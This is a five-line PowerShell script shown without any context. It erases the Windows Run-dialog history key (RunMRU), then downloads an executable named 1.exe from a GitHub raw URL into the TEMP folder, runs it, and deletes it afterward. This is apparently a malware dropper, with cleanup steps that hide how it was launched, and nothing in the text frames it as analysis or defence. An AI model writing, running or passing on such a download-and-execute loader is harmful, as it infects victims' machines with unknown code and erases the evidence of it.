Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Force -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/samanaya/1/main/1.exe" -OutFile "$env:TEMP\\1.exe"
Start-Process "$env:TEMP\\1.exe" -Wait
Start-Sleep -Milliseconds 200
Remove-Item "$env:TEMP\\1.exe"